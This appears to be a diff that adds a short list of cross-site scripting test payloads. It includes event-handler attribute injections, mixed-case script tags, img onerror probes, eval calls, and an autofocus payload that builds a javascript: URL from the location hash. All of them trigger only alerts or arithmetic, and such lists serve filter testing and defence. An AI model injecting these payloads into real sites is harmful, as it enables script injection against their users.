@@ -1,0 +1,20 @@
+\" onfocus=alert('00') \"
+\" onhover=alert('01') \"
+<scRipt>alert('02')</scRipt>
+<img src=# onerror=alert('03') 
+\" onfocus=alert('04') \"
+\" onhover=alert('05') \"
+<scRipt>alert('06')</scRipt>
+<img src=# onerror=alert('07') >
+\" onfocus=alert('08') \"
+\" onhover=alert('09') \"
+<scRipt>alert('10')</scRipt>
+<img src=# onerror=alert('11') >
+<Script>eval(2*3)</scripT>
+<Script>eval(3*3)</scripT>
+<Script>eval(4*3)</scripT>
+<Script>eval(5*3)</scripT>
+<Script>eval(6*3)</scripT>
+<Script>eval(7*3)</scripT>
+<Script>eval(8*3)</scripT>
+<java contentEditable='' autofocus='' onfocus=location=tagName+innerHTML+location.hash>script:/*#*/alert(1)
